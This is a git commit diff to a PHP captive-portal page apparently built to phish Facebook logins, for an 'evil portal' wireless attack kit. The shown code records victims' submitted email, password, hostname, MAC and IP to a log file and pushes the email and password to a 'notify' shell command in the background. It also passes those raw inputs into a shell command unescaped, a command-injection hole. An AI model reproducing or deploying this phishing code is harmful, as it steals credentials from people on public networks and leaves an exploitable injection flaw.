16e7c7fe1a2d331ee8a4e65417ca83cd2517afc8
H4xl0r <31049432+H4xl0r@users.noreply.github.com>
2019-03-26 01:03:18 +0100

    Update MyPortal.php

--- portals/facebook-login/MyPortal.php
+++ portals/facebook-login/MyPortal.php
@@ -46,14 +46,14 @@ class MyPortal extends Portal
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
             file_put_contents("$dir/evilportal-logs/facebook-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
-
-            exec("notify $email' - '$pwd");
+            $this->execBackground("notify $email' - '$pwd");
+            parent::handleAuthorization();
         }
         // handle form input or other extra things there
 
         // Call parent to handle basic authorization first
-        parent::handleAuthorization();
-
+        //parent::handleAuthorization();
+        echo "Error ";
     }
 
     public function showSuccess()
